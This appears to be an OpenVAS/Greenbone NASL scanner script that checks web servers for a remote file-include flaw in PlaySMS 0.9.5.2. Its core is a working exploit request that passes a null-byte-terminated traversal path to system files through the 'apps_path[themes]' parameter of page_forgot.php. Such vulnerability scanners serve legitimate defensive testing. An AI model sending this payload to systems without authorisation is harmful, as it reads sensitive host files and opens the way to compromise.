if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103271" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-09-22 13:43:24 +0200 (Thu, 22 Sep 2011)" );
	script_bugtraq_id( 49474 );
	script_name( "PlaySMS 'apps_path[themes]' Parameter Multiple Remote File Include Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49474" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "PlaySMS is prone to multiple remote file-include
  vulnerabilities because the application fails to sufficiently
  sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting these issues may allow a remote attacker to obtain
  sensitive information or to execute arbitrary script code in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible." );
	script_tag( name: "affected", value: "PlaySMS 0.9.5.2 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/sms", "/playsms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/index.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "/jscss/selectbox.js\"" ) && !ContainsString( buf, "content=\"http://playsms" ) && !ContainsString( buf, "powered_by_playsms.gif" ) )){
		continue;
	}
	for file in keys( files ) {
		url = dir + "/plugin/themes/default/page_forgot.php?apps_path[themes]=/" + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

